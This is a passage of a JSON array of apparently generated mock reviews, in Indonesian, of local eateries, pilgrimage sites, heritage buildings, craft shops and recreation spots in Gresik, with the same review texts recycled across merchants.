                "timestamp": "2026-05-26T14:36:35.403Z"
            },
            {
                "id": "r319",
                "merchantId": "m107",
                "userName": "Warkop_Lover_90",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-18T14:36:35.403Z"
            },
            {
                "id": "r320",
                "merchantId": "m107",
                "userName": "Sejarah_RI_38",
                "rating": 5,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-17T14:36:35.403Z"
            },
            {
                "id": "r321",
                "merchantId": "m107",
                "userName": "Keluarga_Ceria_33",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-24T14:36:35.403Z"
            },
            {
                "id": "r322",
                "merchantId": "m108",
                "userName": "Warkop_Lover_93",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-16T14:36:35.403Z"
            },
            {
                "id": "r323",
                "merchantId": "m108",
                "userName": "Sejarah_RI_56",
                "rating": 4,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-16T14:36:35.403Z"
            },
            {
                "id": "r324",
                "merchantId": "m108",
                "userName": "Keluarga_Ceria_49",
                "rating": 5,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-16T14:36:35.403Z"
            },
            {
                "id": "r325",
                "merchantId": "m109",
                "userName": "Warkop_Lover_40",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r326",
                "merchantId": "m109",
                "userName": "Sejarah_RI_36",
                "rating": 5,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r327",
                "merchantId": "m109",
                "userName": "Keluarga_Ceria_77",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-16T14:36:35.403Z"
            },
            {
                "id": "r328",
                "merchantId": "m110",
                "userName": "Warkop_Lover_25",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-25T14:36:35.403Z"
            },
            {
                "id": "r329",
                "merchantId": "m110",
                "userName": "Sejarah_RI_55",
                "rating": 4,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-28T14:36:35.403Z"
            },
            {
                "id": "r330",
                "merchantId": "m110",
                "userName": "Keluarga_Ceria_75",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-25T14:36:35.403Z"
            },
            {
                "id": "r331",
                "merchantId": "m111",
                "userName": "Warkop_Lover_17",
                "rating": 5,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-24T14:36:35.403Z"
            },
            {
                "id": "r332",
                "merchantId": "m111",
                "userName": "Sejarah_RI_87",
                "rating": 5,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-28T14:36:35.403Z"
            },
            {
                "id": "r333",
                "merchantId": "m111",
                "userName": "Keluarga_Ceria_98",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-17T14:36:35.403Z"
            },
            {
                "id": "r334",
                "merchantId": "m112",
                "userName": "Warkop_Lover_76",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-22T14:36:35.403Z"
            },
            {
                "id": "r335",
                "merchantId": "m112",
                "userName": "Sejarah_RI_77",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-20T14:36:35.403Z"
            },
            {
                "id": "r336",
                "merchantId": "m112",
                "userName": "Keluarga_Ceria_92",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-25T14:36:35.403Z"
            },
            {
                "id": "r337",
                "merchantId": "m113",
                "userName": "Warkop_Lover_42",
                "rating": 4,
                "text": "Sambalnya mantap betul pedas gurihnya pas. Selalu rindu makan di sini tiap mampir ke Gresik.",
                "timestamp": "2026-05-20T14:36:35.403Z"
            },
            {
                "id": "r338",
                "merchantId": "m113",
                "userName": "Sejarah_RI_65",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-24T14:36:35.403Z"
            },
            {
                "id": "r339",
                "merchantId": "m113",
                "userName": "Keluarga_Ceria_51",
                "rating": 4,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-19T14:36:35.403Z"
            },
            {
                "id": "r340",
                "merchantId": "m114",
                "userName": "Warkop_Lover_87",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-25T14:36:35.403Z"
            },
            {
                "id": "r341",
                "merchantId": "m114",
                "userName": "Sejarah_RI_96",
                "rating": 4,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-23T14:36:35.403Z"
            },
            {
                "id": "r342",
                "merchantId": "m114",
                "userName": "Keluarga_Ceria_12",
                "rating": 5,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-15T14:36:35.403Z"
            },
            {
                "id": "r343",
                "merchantId": "m115",
                "userName": "Warkop_Lover_33",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-25T14:36:35.403Z"
            },
            {
                "id": "r344",
                "merchantId": "m115",
                "userName": "Sejarah_RI_27",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-27T14:36:35.403Z"
            },
            {
                "id": "r345",
                "merchantId": "m115",
                "userName": "Keluarga_Ceria_87",
                "rating": 5,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r346",
                "merchantId": "m116",
                "userName": "Warkop_Lover_89",
                "rating": 4,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r347",
                "merchantId": "m116",
                "userName": "Sejarah_RI_65",
                "rating": 5,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-23T14:36:35.403Z"
            },
            {
                "id": "r348",
                "merchantId": "m116",
                "userName": "Keluarga_Ceria_92",
                "rating": 5,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r349",
                "merchantId": "m117",
                "userName": "Warkop_Lover_70",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-18T14:36:35.403Z"
            },
            {
                "id": "r350",
                "merchantId": "m117",
                "userName": "Sejarah_RI_71",
                "rating": 5,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-26T14:36:35.403Z"
            },
            {
                "id": "r351",
                "merchantId": "m117",
                "userName": "Keluarga_Ceria_11",
                "rating": 5,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-20T14:36:35.403Z"
            },
            {
                "id": "r352",
                "merchantId": "m118",
                "userName": "Warkop_Lover_30",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-19T14:36:35.403Z"
            },
            {
                "id": "r353",
                "merchantId": "m118",
                "userName": "Sejarah_RI_86",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-14T14:36:35.403Z"
            },
            {
                "id": "r354",
                "merchantId": "m118",
                "userName": "Keluarga_Ceria_59",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r355",
                "merchantId": "m119",
                "userName": "Warkop_Lover_12",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-28T14:36:35.403Z"
            },
            {
                "id": "r356",
                "merchantId": "m119",
                "userName": "Sejarah_RI_65",
                "rating": 4,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-16T14:36:35.403Z"
            },
            {
                "id": "r357",
                "merchantId": "m119",
                "userName": "Keluarga_Ceria_93",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-22T14:36:35.403Z"
            },
            {
                "id": "r358",
                "merchantId": "m120",
                "userName": "Warkop_Lover_67",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r359",
                "merchantId": "m120",
                "userName": "Sejarah_RI_81",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-16T14:36:35.403Z"
            },
            {
                "id": "r360",
                "merchantId": "m120",
                "userName": "Keluarga_Ceria_78",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-15T14:36:35.403Z"
            },
            {
                "id": "r361",
                "merchantId": "m121",
                "userName": "Neng_Siti_54",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-18T14:36:35.403Z"
            },
            {
                "id": "r362",
                "merchantId": "m121",
                "userName": "Warkop_Lover_10",
                "rating": 5,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-25T14:36:35.403Z"
            },
            {
                "id": "r363",
                "merchantId": "m121",
                "userName": "Sejarah_RI_34",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-15T14:36:35.403Z"
            },
            {
                "id": "r364",
                "merchantId": "m122",
                "userName": "Warkop_Lover_35",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r365",
                "merchantId": "m122",
                "userName": "Sejarah_RI_63",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-28T14:36:35.403Z"
            },
            {
                "id": "r366",
                "merchantId": "m122",
                "userName": "Keluarga_Ceria_78",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-27T14:36:35.403Z"
            },
            {
                "id": "r367",
                "merchantId": "m123",
                "userName": "Neng_Siti_48",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-16T14:36:35.403Z"
            },
            {
                "id": "r368",
                "merchantId": "m123",
                "userName": "Warkop_Lover_98",
                "rating": 5,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-25T14:36:35.403Z"
            },
            {
                "id": "r369",
                "merchantId": "m123",
                "userName": "Sejarah_RI_12",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-27T14:36:35.403Z"
            },
            {
                "id": "r370",
                "merchantId": "m124",
                "userName": "Warkop_Lover_13",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-20T14:36:35.403Z"
            },
            {
                "id": "r371",
                "merchantId": "m124",
                "userName": "Sejarah_RI_19",
                "rating": 5,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-23T14:36:35.403Z"
            },
            {
                "id": "r372",
                "merchantId": "m124",
                "userName": "Keluarga_Ceria_54",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-22T14:36:35.403Z"
            },
            {
                "id": "r373",
                "merchantId": "m125",
                "userName": "Warkop_Lover_29",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-18T14:36:35.403Z"
            },
            {
                "id": "r374",
                "merchantId": "m125",
                "userName": "Sejarah_RI_37",
                "rating": 4,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-15T14:36:35.403Z"
            },
            {
                "id": "r375",
                "merchantId": "m125",
                "userName": "Keluarga_Ceria_25",
                "rating": 5,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-14T14:36:35.403Z"
            },
            {
                "id": "r376",
                "merchantId": "m126",
                "userName": "Warkop_Lover_87",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-23T14:36:35.403Z"
            },
            {
                "id": "r377",
                "merchantId": "m126",
                "userName": "Sejarah_RI_97",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-17T14:36:35.403Z"
            },
            {
                "id": "r378",
                "merchantId": "m126",
                "userName": "Keluarga_Ceria_41",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-25T14:36:35.403Z"
            },
            {
                "id": "r379",
                "merchantId": "m127",
                "userName": "Warkop_Lover_86",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r380",
                "merchantId": "m127",
                "userName": "Sejarah_RI_62",
                "rating": 5,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-25T14:36:35.403Z"
            },
            {
                "id": "r381",
                "merchantId": "m127",
                "userName": "Keluarga_Ceria_66",
                "rating": 5,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-19T14:36:35.403Z"
            },
            {
                "id": "r382",
                "merchantId": "m128",
                "userName": "Neng_Siti_68",
                "rating": 5,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-16T14:36:35.403Z"
            },
            {
                "id": "r383",
                "merchantId": "m128",
                "userName": "Warkop_Lover_36",
                "rating": 5,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-28T14:36:35.403Z"
            },
            {
                "id": "r384",
                "merchantId": "m128",
                "userName": "Sejarah_RI_29",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-18T14:36:35.403Z"
            },
            {
                "id": "r385",
                "merchantId": "m129",
                "userName": "Warkop_Lover_16",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-14T14:36:35.403Z"
            },
            {
                "id": "r386",
                "merchantId": "m129",
                "userName": "Sejarah_RI_14",
                "rating": 4,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-26T14:36:35.403Z"
            },
            {
                "id": "r387",
                "merchantId": "m129",
                "userName": "Keluarga_Ceria_25",
                "rating": 5,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-19T14:36:35.403Z"
            },
            {
                "id": "r388",
                "merchantId": "m130",
                "userName": "Warkop_Lover_77",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-14T14:36:35.403Z"
            },
            {
                "id": "r389",
                "merchantId": "m130",
                "userName": "Sejarah_RI_53",
                "rating": 4,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r390",
                "merchantId": "m130",
                "userName": "Keluarga_Ceria_63",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-17T14:36:35.403Z"
            },
            {
                "id": "r391",
                "merchantId": "m131",
                "userName": "Warkop_Lover_57",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-17T14:36:35.403Z"
            },
            {
                "id": "r392",
                "merchantId": "m131",
                "userName": "Sejarah_RI_18",
                "rating": 5,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-27T14:36:35.403Z"
            },
            {
                "id": "r393",
                "merchantId": "m131",
                "userName": "Keluarga_Ceria_55",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-27T14:36:35.403Z"
            },
            {
                "id": "r394",
                "merchantId": "m132",
                "userName": "Warkop_Lover_39",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-20T14:36:35.403Z"
            },
            {
                "id": "r395",
                "merchantId": "m132",
                "userName": "Sejarah_RI_32",
                "rating": 4,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-15T14:36:35.403Z"
            },
            {
                "id": "r396",
                "merchantId": "m132",
                "userName": "Keluarga_Ceria_86",
                "rating": 5,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-22T14:36:35.403Z"
            },
            {
                "id": "r397",
                "merchantId": "m133",
                "userName": "Warkop_Lover_91",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-26T14:36:35.403Z"
            },
            {
                "id": "r398",
                "merchantId": "m133",
                "userName": "Sejarah_RI_13",
                "rating": 5,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-28T14:36:35.403Z"
            },
            {
                "id": "r399",
                "merchantId": "m133",
                "userName": "Keluarga_Ceria_87",
                "rating": 5,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-20T14:36:35.403Z"
            },
            {
                "id": "r400",
                "merchantId": "m134",
                "userName": "Warkop_Lover_58",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r401",
                "merchantId": "m134",
                "userName": "Sejarah_RI_88",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-21T14:36:35.403Z"
            },
            {
                "id": "r402",
                "merchantId": "m134",
                "userName": "Keluarga_Ceria_39",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-15T14:36:35.403Z"
            },
            {
                "id": "r403",
                "merchantId": "m135",
                "userName": "Warkop_Lover_16",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-14T14:36:35.403Z"
            },
            {
                "id": "r404",
                "merchantId": "m135",
                "userName": "Sejarah_RI_77",
                "rating": 5,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-28T14:36:35.403Z"
            },
            {
                "id": "r405",
                "merchantId": "m135",
                "userName": "Keluarga_Ceria_33",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-14T14:36:35.403Z"
            },
            {
                "id": "r406",
                "merchantId": "m136",
                "userName": "Warkop_Lover_10",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-19T14:36:35.403Z"
            },
            {
                "id": "r407",
                "merchantId": "m136",
                "userName": "Sejarah_RI_12",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-17T14:36:35.403Z"
            },
            {
                "id": "r408",
                "merchantId": "m136",
                "userName": "Keluarga_Ceria_45",
                "rating": 5,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-25T14:36:35.403Z"
            },
            {
                "id": "r409",
                "merchantId": "m137",
                "userName": "Warkop_Lover_54",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-28T14:36:35.403Z"
            },
            {
                "id": "r410",
                "merchantId": "m137",
                "userName": "Sejarah_RI_38",
                "rating": 5,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-20T14:36:35.403Z"
            },
            {
                "id": "r411",
                "merchantId": "m137",
                "userName": "Keluarga_Ceria_22",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-14T14:36:35.403Z"
            },
            {
                "id": "r412",
                "merchantId": "m138",
                "userName": "Haji_Sukri_91",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-18T14:36:35.403Z"
            },
            {
                "id": "r413",
                "merchantId": "m138",
                "userName": "Neng_Siti_77",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-26T14:36:35.403Z"
            },
            {
                "id": "r414",
                "merchantId": "m138",
                "userName": "Warkop_Lover_33",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-24T14:36:35.403Z"
            },
            {
                "id": "r415",
                "merchantId": "m139",
                "userName": "Warkop_Lover_85",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-28T14:36:35.403Z"
            },
            {
                "id": "r416",
                "merchantId": "m139",
                "userName": "Sejarah_RI_15",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-23T14:36:35.403Z"
            },
            {
                "id": "r417",
                "merchantId": "m139",
                "userName": "Keluarga_Ceria_17",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-19T14:36:35.403Z"
            },
            {
                "id": "r418",
                "merchantId": "m140",
                "userName": "Warkop_Lover_39",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-16T14:36:35.403Z"
            },
            {
                "id": "r419",
                "merchantId": "m140",
                "userName": "Sejarah_RI_33",
                "rating": 4,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-16T14:36:35.403Z"
            },
            {
                "id": "r420",
                "merchantId": "m140",
                "userName": "Keluarga_Ceria_96",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-20T14:36:35.404Z"
            },
            {
                "id": "r421",
                "merchantId": "m141",
                "userName": "Warkop_Lover_71",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-19T14:36:35.404Z"
            },
            {
                "id": "r422",
                "merchantId": "m141",
                "userName": "Sejarah_RI_50",
                "rating": 4,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-21T14:36:35.404Z"
            },
            {
                "id": "r423",
                "merchantId": "m141",
                "userName": "Keluarga_Ceria_43",
                "rating": 5,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-20T14:36:35.404Z"
            },
            {
                "id": "r424",
                "merchantId": "m142",
                "userName": "Warkop_Lover_66",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-28T14:36:35.404Z"
            },
            {
                "id": "r425",
                "merchantId": "m142",
                "userName": "Sejarah_RI_42",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-21T14:36:35.404Z"
            },
            {
                "id": "r426",
                "merchantId": "m142",
                "userName": "Keluarga_Ceria_42",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-17T14:36:35.404Z"
            },
            {
                "id": "r427",
                "merchantId": "m143",
                "userName": "Warkop_Lover_28",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-23T14:36:35.404Z"
            },
            {
                "id": "r428",
                "merchantId": "m143",
                "userName": "Sejarah_RI_89",
                "rating": 5,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-24T14:36:35.404Z"
            },
            {
                "id": "r429",
                "merchantId": "m143",
                "userName": "Keluarga_Ceria_85",
                "rating": 5,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-26T14:36:35.404Z"
            },
            {
                "id": "r430",
                "merchantId": "m144",
                "userName": "Warkop_Lover_52",
                "rating": 4,
                "text": "Belajar cara memerah susu etawa steril langsung dari kandang peternakan, edukatif dan sehat.",
                "timestamp": "2026-05-19T14:36:35.404Z"
            },
            {
                "id": "r431",
                "merchantId": "m144",
                "userName": "Sejarah_RI_40",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-18T14:36:35.404Z"
            },
            {
                "id": "r432",
                "merchantId": "m144",
                "userName": "Keluarga_Ceria_31",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-24T14:36:35.404Z"
            },
            {
